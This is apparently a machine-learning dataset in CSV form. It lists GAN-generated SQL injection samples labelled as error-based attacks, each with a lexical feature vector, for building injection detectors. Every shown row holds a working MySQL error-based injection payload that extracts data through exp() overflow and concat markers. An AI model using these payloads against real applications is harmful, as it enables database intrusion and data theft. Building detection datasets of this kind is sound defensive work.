id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000224,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,5.538497761689716,176.5809326171875,72.69316101074219,32.077579498291016,94.74815368652344,-4.3882832527160645,72.84949493408203,21.682405471801758,0.08116304874420166,0.3688834607601166,0.16441386938095093,0.4139777421951294,0.13664421439170837,4.0407257080078125,2.0123279094696045,0.1051257997751236,0.36809229850769043,-0.07762949913740158,-0.06182704493403435,-0.6547175049781799,10.277111053466797,9.665881156921387,4.3239030838012695,0.9083477258682251,1.830435872077942,-0.11330490559339523,0.4206741750240326,0.2864629328250885,-0.018749218434095383,-0.07905203849077225,0.512093186378479,0.7334014177322388,2.2591097354888916,-0.30837905406951904,0.10560213774442673,1.3232330083847046,5.2159576416015625,1.372685432434082,3.3705623149871826,0.2007213979959488,0.1354723870754242,0.14689980447292328,0.10649940371513367,0.16001521050930023,-0.41561275720596313,-0.801952600479126,0.2624437212944031,-0.07129113376140594,0.21065469086170197,0.117047980427742,0.453151673078537,0.22675210237503052,0.1724892556667328,0.118788942694664,0.3051352798938751,0.014466441236436367,0.1588628888130188,-0.13855388760566711,0.5518966913223267,0.31087520718574524,-0.005227193236351013,0.13566118478775024,-0.217077374458313,-0.578593373298645,-0.09492384642362595,0.23879915475845337,0.48557528853416443,-0.2704726457595825,-0.4558740258216858,-0.09352216124534607,-0.08971729129552841,0.33306723833084106,0.035727959126234055,-0.12898750603199005,-0.06268034130334854,-0.012084515765309334,0.26992085576057434,0.6654080748558044,0.7072266340255737,0.23162607848644257,0.34354886412620544,8.890408515930176,0.4744420349597931,-0.06843391805887222,0.2182665765285492,0.4791819453239441,0.20428642630577087,0.04550426825881004,0.3543012738227844
GAN_000225,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.514293736835061,186.51889038085938,72.95836639404297,33.728271484375,86.91593170166016,-2.479088544845581,63.71079635620117,25.84734535217285,0.7496241331100464,0.3273710608482361,0.1671150177717209,0.4038952589035034,0.13449200987815857,3.8867533206939697,1.7683974504470825,0.45464202761650085,0.7051084637641907,-0.046200014650821686,-0.04008450731635094,-0.6306154727935791,8.28746223449707,9.17387866973877,4.341032981872559,0.5154756307601929,1.6907613277435303,-0.07368247956037521,0.3448522984981537,0.32867342233657837,-0.001754414290189743,0.2450471818447113,0.31931567192077637,0.596258819103241,2.261028528213501,0.2230512946844101,0.3320868909358978,1.3419963121414185,5.007537364959717,0.9485794305801392,2.6828975677490234,0.25199243426322937,0.1929292380809784,0.2993060350418091,0.24320796132087708,0.14335739612579346,-0.37720441818237305,-0.25279709696769714,0.12714235484600067,0.009047001600265503,0.18542128801345825,0.06309154629707336,0.26314350962638855,0.2920672297477722,0.10417038947343826,-0.0037309378385543823,0.22482524812221527,0.06522930413484573,0.18128062784671783,-0.02835540845990181,0.21041861176490784,0.11305353790521622,-0.26641392707824707,0.20334511995315552,0.04907049983739853,-0.37782472372055054,0.01808929070830345,0.13490048050880432,0.7806475162506104,-0.39907628297805786,-0.2653998136520386,-0.2000393271446228,0.05658799782395363,-0.06046031787991524,0.041291046887636185,0.009467646479606628,-0.038248565047979355,0.0024144845083355904,0.5769196152687073,0.4579189419746399,0.3902369737625122,0.16954322159290314,0.14833402633666992,7.9656853675842285,0.4489969313144684,-0.012799017131328583,0.10037436336278915,0.6024888157844543,0.08682632446289062,-0.022693932056427002,-0.05151182785630226
GAN_000226,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.70100348496759,194.79156494140625,72.42010498046875,34.89406967163086,91.62836456298828,-1.6165955066680908,68.51802825927734,26.097366333007812,0.4516528248786926,0.34731465578079224,0.17339056730270386,0.40043577551841736,0.1331576108932495,3.9744646549224854,1.734486699104309,0.31197163462638855,0.461243212223053,0.013663262128829956,0.025804337114095688,-0.08091989159584045,8.78885269165039,9.111224174499512,4.678037166595459,0.41858378052711487,1.6183767318725586,-0.003464169567450881,0.12865494191646576,0.2712923586368561,0.07433884590864182,0.324145644903183,0.40852415561676025,0.20670467615127563,2.4398272037506104,0.021762961521744728,0.28750625252723694,1.375191330909729,5.9696550369262695,1.280984878540039,2.857436418533325,0.08876658231019974,0.21390433609485626,0.3725608289241791,0.233536958694458,0.1316196769475937,-0.4170495867729187,-0.37972331047058105,0.16505707800388336,0.06760510802268982,0.36575254797935486,0.18239714205265045,0.41235899925231934,0.1393006443977356,0.2027246356010437,-0.26263427734375,0.20296776294708252,0.04777960851788521,0.1631370186805725,-0.039504315704107285,0.07173573970794678,0.08743486553430557,-0.15396445989608765,-0.042344145476818085,-0.00884564220905304,-0.15419594943523407,-0.039434973150491714,-0.01352391391992569,0.6083584427833557,-0.24479380249977112,-0.11907365173101425,0.05449039861559868,0.041968174278736115,0.06709876656532288,0.11770838499069214,-0.01090286672115326,-0.040524568408727646,-0.007848221808671951,0.6465177536010742,0.44692090153694153,0.26392680406570435,0.25817474722862244,0.323921263217926,8.416451454162598,0.5352126955986023,0.016247272491455078,0.14751440286636353,0.6794058084487915,0.2697172462940216,-0.014814987778663635,0.02581068128347397
GAN_000227,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000166,6.0773966684502945,125.23884582519531,80.10210418701172,28.211885452270508,84.51551055908203,-8.706463813781738,55.27717971801758,25.571935653686523,0.762580156326294,0.33112049102783203,0.16961674392223358,0.4173808693885803,0.14283838868141174,3.9425363540649414,2.500234365463257,0.48204752802848816,1.142514705657959,-0.223151296377182,-0.10176056623458862,-1.1932506561279297,8.604188919067383,9.603606224060059,5.15967321395874,0.8626340627670288,1.6695854663848877,-0.3559100329875946,0.7553493976593018,0.5526124238967896,-0.08429323136806488,-0.05792171508073807,0.515273928642273,1.1834290027618408,2.50510311126709,0.4764411449432373,0.5359860062599182,1.0607085227966309,2.8355610370635986,0.6283723711967468,2.9934909343719482,-0.030937455594539642,0.16383495926856995,-0.35050517320632935,0.3144819736480713,0.25050288438796997,-0.7589527368545532,-0.2139478325843811,0.259272038936615,-0.15838350355625153,0.21143855154514313,-0.19353048503398895,0.15745142102241516,0.34919965267181396,0.2657119333744049,-0.022312205284833908,0.11701026558876038,0.07937897741794586,0.15352243185043335,-0.21876588463783264,0.4225028157234192,-0.003579340875148773,-0.36363932490348816,0.5310850143432617,0.052137650549411774,-0.6843904256820679,-0.1255018413066864,0.3535064160823822,0.8349692225456238,-0.9676925539970398,-0.5074335336685181,-0.3791331648826599,0.04095526039600372,-0.1419043391942978,0.021597951650619507,0.14285118877887726,-0.07572755217552185,-0.001995715545490384,0.3710483908653259,0.4939899742603302,0.7535586357116699,0.09222527593374252,-0.2195512354373932,6.60184907913208,0.23516462743282318,-0.15511533617973328,0.06302544474601746,0.4991602897644043,0.20479604601860046,0.17242373526096344,-0.25615012645721436
GAN_000228,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.507939881023094,194.49462890625,72.18014526367188,34.76206588745117,84.59666442871094,2.366023540496826,65.23252868652344,25.381183624267578,0.6803945302963257,0.330472856760025,0.16555224359035492,0.40769508481025696,0.13083358108997345,3.843385696411133,1.381463646888733,0.6582314968109131,0.6857622861862183,-0.008300714194774628,0.03827971592545509,-0.4516023099422455,7.1206817626953125,8.71950626373291,4.317379474639893,0.49281495809555054,1.6921638250350952,-0.029327191412448883,0.24532316625118256,0.45894908905029297,0.08974292874336243,0.32356691360473633,0.3638303577899933,0.39650651812553406,2.183168411254883,0.1147383451461792,0.29569771885871887,1.5848606824874878,5.142752647399902,1.0653129816055298,2.298827886581421,0.1063411608338356,0.1320975422859192,0.30888447165489197,0.14259988069534302,0.18014799058437347,-0.38992446660995483,-0.1852002739906311,0.05207151174545288,0.1303030550479889,0.2373306155204773,0.052264198660850525,0.3858500123023987,0.20709970593452454,-0.16841447353363037,0.10766930878162384,0.26673680543899536,0.09470537304878235,0.14435704052448273,0.18174710869789124,-0.015477314591407776,0.03234059363603592,-0.003286495804786682,0.14120429754257202,-0.02942192554473877,-0.14585286378860474,0.05411049351096153,0.010105632245540619,0.7830264568328857,-0.34331178665161133,-0.11292054504156113,-0.13330252468585968,0.16341108083724976,-0.1637863963842392,-0.04069117084145546,0.04054377228021622,-0.02171877585351467,0.005335064139217138,0.7051359415054321,0.4282802939414978,0.4480281174182892,0.15517646074295044,0.09110181033611298,7.3790602684021,0.3538212776184082,0.04390871524810791,0.10905290395021439,0.646202802658081,0.036068715155124664,-0.24848608672618866,-0.1955886036157608
GAN_000229,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.605557985416698,186.69606018066406,69.9480972290039,35.2966423034668,82.20531463623047,-2.9550540447235107,64.1864013671875,25.961301803588867,0.9132881760597229,0.33711594343185425,0.17928606271743774,0.40623000264167786,0.13408230245113373,3.8769514560699463,1.3973749876022339,0.357028990983963,0.5843508243560791,0.08845677226781845,-0.06035879626870155,-0.33844420313835144,8.466832160949707,8.730184555053711,4.083596229553223,0.36748406291007996,1.7729264497756958,0.03696533292531967,0.18660736083984375,0.4460427761077881,0.0269399955868721,0.1887003481388092,0.31530511379241943,0.483865886926651,2.1290454864501953,0.1142384260892868,0.23918427526950836,1.5842951536178589,5.3456501960754395,1.0368136167526245,2.710834503173828,0.3549848198890686,0.1503681242465973,0.3389022648334503,0.303703248500824,0.10679084062576294,-0.2924952507019043,-0.20742058753967285,0.14995495975017548,0.12124252319335938,0.1448824256658554,0.08812099695205688,0.38485896587371826,0.2957698404788971,-0.07966651767492294,0.05872838944196701,0.34086573123931885,0.10819827765226364,0.16401544213294983,0.24012592434883118,0.09735669195652008,0.1341349184513092,-0.1073111891746521,0.1517539918422699,-0.09581772983074188,0.047021664679050446,0.07527926564216614,0.054930612444877625,0.8351024985313416,-0.2868351340293884,-0.2674136757850647,-0.21392372250556946,0.2357807159423828,-0.053940389305353165,0.06446809321641922,-0.13767141103744507,-0.035446103662252426,0.008936773985624313,0.432265043258667,0.46714267134666443,0.3811524212360382,0.22881421446800232,0.19284553825855255,8.276382446289062,0.3720265328884125,0.042877502739429474,0.12160993367433548,0.6429435610771179,-0.08337573707103729,-0.21626006066799164,-0.20662610232830048
GAN_000230,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,4.852046074071097,159.78561401367188,73.85243225097656,34.06297302246094,89.94512939453125,0.36144062876701355,63.55424118041992,26.893939971923828,0.8441598415374756,0.3080550730228424,0.1624380350112915,0.40359264612197876,0.13536371290683746,3.8420448303222656,1.9055901765823364,0.5531178712844849,1.0133018493652344,-0.07325579971075058,-0.06592389196157455,-0.6463042497634888,7.1345906257629395,8.977765083312988,5.112212657928467,0.554363489151001,1.5952895879745483,-0.13588616251945496,0.39226600527763367,0.637500524520874,0.009663309901952744,0.28858682513237,0.3773950934410095,0.5487877726554871,2.303117513656616,0.4540795683860779,0.37872326374053955,1.4775444269180298,3.7482845783233643,0.4839312434196472,2.054147958755493,-0.0914253517985344,0.24871112406253815,0.24508444964885712,0.31286096572875977,0.1539270132780075,-0.44589608907699585,0.10457810759544373,0.07369387149810791,0.07364346086978912,0.26492226123809814,-0.053104862570762634,0.25518226623535156,0.38175639510154724,0.11439527571201324,0.002372466027736664,0.26647284626960754,0.12336810678243637,0.16335710883140564,0.2504366338253021,-0.05314015597105026,-0.05101628601551056,-0.09201327711343765,0.7403371930122375,0.03177409619092941,-0.3875390589237213,-0.05994729325175285,0.16256928443908691,0.8213102221488953,-0.7178042531013489,-0.10522205382585526,-0.32733461260795593,-0.09454386681318283,-0.3491746783256531,-0.2177233099937439,-0.11567273736000061,-0.06282313913106918,0.00968163087964058,0.6370108127593994,0.29317522048950195,0.502677857875824,0.06630948185920715,-0.17794224619865417,6.821879863739014,0.28884243965148926,0.09989214688539505,0.021830735728144646,0.5047422647476196,-0.18132519721984863,0.07740545272827148,-0.244132399559021
GAN_000231,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.541879803817778,180.12646484375,71.1187515258789,37.126155853271484,92.09300994873047,-0.563620388507843,66.66410064697266,27.634981155395508,0.5085785388946533,0.309643030166626,0.17089678347110748,0.3951821029186249,0.13249363005161285,3.825232982635498,1.8540209531784058,0.49034053087234497,0.7930929064750671,0.014486812055110931,0.010580292902886868,-0.11324147880077362,6.97704553604126,9.187612533569336,5.074049472808838,0.3972644507884979,1.4811078310012817,0.003764204913750291,-0.011902827769517899,0.4334334433078766,0.10306743532419205,0.555489182472229,0.1254441738128662,0.22123724222183228,2.431617498397827,0.3050500154495239,0.3683871924877167,1.5048918724060059,5.3698649406433105,0.8742737174034119,2.1083221435546875,-0.03986766189336777,0.2158607542514801,0.4192619323730469,0.29449462890625,0.13584117591381073,-0.23752981424331665,0.02946346253156662,0.18615736067295074,0.06789843738079071,0.37737026810646057,0.09116722643375397,0.2521018087863922,0.1600811779499054,0.30290326476097107,-0.1765207052230835,0.22130143642425537,0.09847141802310944,0.21365603804588318,0.24891260266304016,-0.18593694269657135,-0.022469617426395416,-0.00602036714553833,-0.048964835703372955,0.040782228112220764,-0.08324772119522095,-0.023478318005800247,0.039551377296447754,0.7373415231704712,-0.5130585432052612,-0.01446579024195671,0.08060355484485626,-0.07036390155553818,-0.22847069799900055,-0.11129005253314972,0.11715249717235565,-0.045517247170209885,0.002781778573989868,1.000441551208496,0.34900423884391785,0.28261440992355347,0.2058960646390915,0.10529378056526184,7.758791446685791,0.3705526292324066,0.06919503957033157,0.08509837090969086,0.5982633829116821,0.04672091454267502,-0.03971425071358681,-0.2404007911682129
GAN_000232,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000638,4.490121707141001,198.44033813476562,74.07879638671875,37.413936614990234,86.88374328613281,-4.037028789520264,66.05937194824219,27.574607849121094,0.6919823884963989,0.3241533041000366,0.15760451555252075,0.3967136740684509,0.12992039322853088,3.836697816848755,1.8051707744598389,0.7979367971420288,0.8141316175460815,-0.06040231138467789,0.004938151221722364,-0.4617938995361328,8.560007095336914,9.111839294433594,4.506187438964844,0.23802399635314941,1.6596438884735107,0.023738890886306763,0.2979065775871277,0.3626404404640198,0.06771079450845718,0.49462828040122986,0.13656583428382874,0.22761473059654236,2.281923770904541,0.10265877842903137,0.2953921854496002,1.7264189720153809,5.647027492523193,1.1074156761169434,2.655625820159912,-0.09626387804746628,0.3139010965824127,0.4407084882259369,0.2677910327911377,0.14052574336528778,-0.1736016869544983,-0.028804674744606018,0.10130181908607483,0.14301694929599762,0.2848687469959259,0.173139289021492,0.3243507146835327,0.3242039978504181,0.00037020444869995117,0.06742347776889801,0.26269784569740295,0.09082261472940445,0.2005743533372879,0.11060206592082977,-0.06250626593828201,0.3783993721008301,0.065854012966156,0.3670216202735901,-0.1257651001214981,-0.16545754671096802,0.061299700289964676,0.12397115677595139,0.8129191994667053,-0.35798346996307373,-0.1495361179113388,-0.11771818995475769,-0.04484212398529053,-0.18361887335777283,0.08292625844478607,-0.11123323440551758,-0.028888050466775894,-0.001310702064074576,0.6899831891059875,0.35809776186943054,0.2869688868522644,0.11490007489919662,0.055582527071237564,7.663582801818848,0.45983290672302246,0.07484107464551926,0.10439173132181168,0.6939014196395874,-0.04178817570209503,-0.20523418486118317,0.17566832900047302
GAN_000233,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,4.592738239908199,181.2027130126953,74.28703308105469,35.428707122802734,87.34269714355469,2.5610735416412354,61.908164978027344,25.338022232055664,0.7641054391860962,0.31565046310424805,0.15413159132003784,0.405391663312912,0.13050803542137146,3.766119956970215,1.5423071384429932,0.8759644031524658,1.0195374488830566,-0.06879336386919022,0.021560685709118843,-0.7481552958488464,7.174154281616211,8.907514572143555,4.883237838745117,0.49481478333473206,1.6494277715682983,-0.04896681755781174,0.41183987259864807,0.5120394229888916,0.09178495407104492,0.42885294556617737,0.14063577353954315,0.46703776717185974,2.332274913787842,0.27421873807907104,0.36757633090019226,1.7186110019683838,4.49812126159668,0.861017644405365,2.391125440597534,-0.13647638261318207,0.2827218174934387,0.259817898273468,0.2256026566028595,0.17192301154136658,-0.24146753549575806,-0.07833762466907501,0.018286466598510742,0.064867302775383,0.32874464988708496,0.010420337319374084,0.2834238111972809,0.25468480587005615,-0.026248954236507416,0.1842089146375656,0.28471651673316956,0.1160086914896965,0.18141505122184753,0.1271422654390335,-0.19862253963947296,0.08283237367868423,0.15970450639724731,0.38967078924179077,-0.013636916875839233,-0.42726874351501465,0.05707176774740219,0.2039160132408142,0.8920804858207703,-0.4840014576911926,-0.09250204265117645,-0.11243990063667297,-0.10062413662672043,-0.3619762659072876,-0.1112796813249588,-0.21590188145637512,-0.02887853980064392,0.0061852820217609406,0.7585145235061646,0.3968055844306946,0.5665565729141235,0.09266860038042068,-0.11864528059959412,6.825614929199219,0.33407315611839294,0.07005072385072708,0.08871582895517349,0.6391093730926514,-0.1300559937953949,-0.252519428730011,-0.08340328931808472
GAN_000234,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000166,5.008579742281354,150.5173797607422,78.54169464111328,31.597946166992188,82.77005004882812,-3.3071811199188232,55.84310531616211,27.06608009338379,1.1464954614639282,0.308038592338562,0.16957759857177734,0.4058631658554077,0.13554692268371582,3.8117878437042236,2.0895843505859375,0.5406672358512878,1.1064777374267578,-0.11023163050413132,-0.11384181678295135,-0.8329172134399414,7.676321029663086,9.017631530761719,4.962121486663818,0.5683118104934692,1.6182081699371338,-0.20858260989189148,0.6241706013679504,0.6030840277671814,-0.06228778883814812,0.2154727280139923,0.36248549818992615,0.813220202922821,2.309492349624634,0.62148118019104,0.4510696530342102,1.3894656896591187,3.359006881713867,0.3956878185272217,2.3733890056610107,0.14281463623046875,0.2676349878311157,0.09990505874156952,0.35258516669273376,0.151193305850029,-0.46225857734680176,0.051058027893304825,0.03611959517002106,-0.03716881573200226,0.14051638543605804,-0.10619689524173737,0.12586617469787598,0.401454359292984,0.09650971740484238,0.13205169141292572,0.28508874773979187,0.08661855757236481,0.17979852855205536,0.007995527237653732,0.1974477767944336,0.09745679050683975,-0.28291189670562744,0.6240823268890381,0.12885668873786926,-0.47280630469322205,-0.007160771172493696,0.36088284850120544,0.9417434334754944,-0.7769491076469421,-0.28230223059654236,-0.426708459854126,0.08416815102100372,-0.3930867910385132,-0.15424950420856476,-0.030112028121948242,-0.05527708679437637,0.009285074658691883,0.5894331932067871,0.4647561311721802,0.4094686806201935,0.030786670744419098,-0.12451505661010742,6.740281105041504,0.32902979850769043,0.04685545712709427,0.050942547619342804,0.5215104222297668,-0.20756730437278748,0.08619090914726257,-0.21279898285865784
GAN_000235,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000166,4.878242647075466,157.69741821289062,74.74239349365234,33.9255485534668,87.76227569580078,-2.3890974521636963,58.67713928222656,25.03506088256836,0.7678210735321045,0.3171573579311371,0.16590516269207,0.4128115475177765,0.13648076355457306,3.8297111988067627,2.0192272663116455,0.7441360950469971,1.1059027910232544,-0.062380872666835785,-0.018456581979990005,-0.9202167391777039,7.368223190307617,9.401126861572266,4.861911773681641,0.6010972261428833,1.5740872621536255,-0.13255423307418823,0.448574036359787,0.5109305381774902,0.03821559622883797,0.29073193669319153,0.32693150639533997,0.7653107643127441,2.3965892791748047,0.3425966203212738,0.43941235542297363,1.3816441297531128,4.005052089691162,0.7827635407447815,2.404571533203125,-0.07585924118757248,0.1809816211462021,-0.043469324707984924,0.27383702993392944,0.20825934410095215,-0.48561084270477295,-0.14622598886489868,0.17198188602924347,-0.049893900752067566,0.3044741749763489,-0.05532856285572052,0.19330383837223053,0.273584246635437,0.2732011377811432,0.11607243120670319,0.1867012232542038,0.12550011277198792,0.21360614895820618,0.044267985969781876,-0.04361312836408615,-0.1756264865398407,-0.08937515318393707,0.21011871099472046,0.03761022537946701,-0.4374821186065674,-0.05034815892577171,0.17128711938858032,0.8671056032180786,-0.6445472240447998,-0.2685987949371338,-0.07102879881858826,-0.06504345685243607,-0.2614908218383789,-0.14658041298389435,0.12990662455558777,-0.053216639906167984,0.00425213947892189,0.700124204158783,0.3908999264240265,0.550714373588562,0.11455074697732925,-0.11565276980400085,6.753364562988281,0.26587116718292236,-0.04239916056394577,0.08373939245939255,0.5888698101043701,0.156551793217659,0.005818016827106476,-0.35269778966903687
GAN_000236,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000166,5.085414855068033,164.06719970703125,74.20549011230469,32.5982780456543,86.45575714111328,1.4606904983520508,61.38003921508789,23.709922790527344,0.5262261629104614,0.33203786611557007,0.15498214960098267,0.4144303500652313,0.13356655836105347,3.832568407058716,1.6958744525909424,0.9595431089401245,0.9813903570175171,-0.11321338266134262,0.038915056735277176,-0.907240629196167,7.043506145477295,9.315024375915527,4.72926664352417,0.7324295043945312,1.6786388158798218,-0.12491048127412796,0.5544158816337585,0.5180813074111938,0.0895656943321228,0.2534134089946747,0.28642213344573975,0.7336933612823486,2.4056529998779297,0.20975685119628906,0.4285776615142822,1.4682554006576538,3.8197357654571533,1.0242030620574951,2.5245063304901123,-0.23214946687221527,0.21518690884113312,0.011201546527445316,0.1205376386642456,0.24367938935756683,-0.4014749526977539,-0.2706916332244873,0.11210125684738159,0.03808526694774628,0.29812321066856384,-0.029955878853797913,0.36127015948295593,0.2427496314048767,-0.01601216197013855,0.2872629463672638,0.22340723872184753,0.13580931723117828,0.132539764046669,0.025203753262758255,0.03776243329048157,-0.013723470270633698,0.12372627854347229,0.2734803557395935,-0.0004316270351409912,-0.5165790319442749,0.0014324005460366607,0.13750487565994263,0.7829164862632751,-0.5363823175430298,-0.15869544446468353,-0.13869792222976685,-0.13458773493766785,-0.2752076983451843,-0.04489314928650856,0.030671902000904083,-0.038426805287599564,-0.00016589630104135722,0.7166783809661865,0.3984714150428772,0.7323050498962402,0.057951051741838455,-0.21201232075691223,6.573752403259277,0.2561856210231781,-0.0597858801484108,0.09372121840715408,0.5965485572814941,0.06987418979406357,-0.26966750621795654,-0.10695821791887283
GAN_000237,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000463,4.750907573390348,200.5167999267578,73.07135009765625,32.305450439453125,91.72814178466797,-2.7067086696624756,66.26821899414062,24.912242889404297,0.30456268787384033,0.3600431978702545,0.16903209686279297,0.40522822737693787,0.13274900615215302,3.943364381790161,1.7343883514404297,0.7618780136108398,0.3844527304172516,0.0019593238830566406,0.0735098347067833,-0.2584664523601532,9.232507705688477,8.725727081298828,4.582275390625,0.5032755732536316,1.8205543756484985,-0.009992770850658417,0.28997501730918884,0.2372106909751892,0.09261355549097061,0.3659954369068146,0.3540515899658203,0.37044277787208557,2.389240026473999,-0.246847003698349,0.22172436118125916,1.501367449760437,6.011260986328125,1.3846811056137085,3.364041805267334,0.21526573598384857,0.11387641727924347,0.34208548069000244,0.11966351419687271,0.2233380526304245,-0.29245448112487793,-0.6431455612182617,0.11676095426082611,0.04904617369174957,0.3240581452846527,0.18844199180603027,0.3645181655883789,0.11294367909431458,0.06373634934425354,0.043143756687641144,0.20427396893501282,0.03355291485786438,0.15913201868534088,-0.20985567569732666,0.14108431339263916,0.16393589973449707,0.0860643982887268,-0.1834898740053177,-0.08579549193382263,-0.4255392849445343,-0.01664428785443306,-0.14987486600875854,0.6125460267066956,-0.03650286793708801,-0.2299177497625351,0.19628161191940308,0.0886029452085495,0.21110399067401886,0.17788414657115936,-0.013943001627922058,-0.0071459258906543255,-0.01215381734073162,0.670808732509613,0.558955729007721,0.455792635679245,0.23470157384872437,0.3128637373447418,8.893746376037598,0.45221757888793945,-0.046378664672374725,0.23978476226329803,0.7043943405151367,0.23773689568042755,-0.065065398812294,-0.04795720428228378
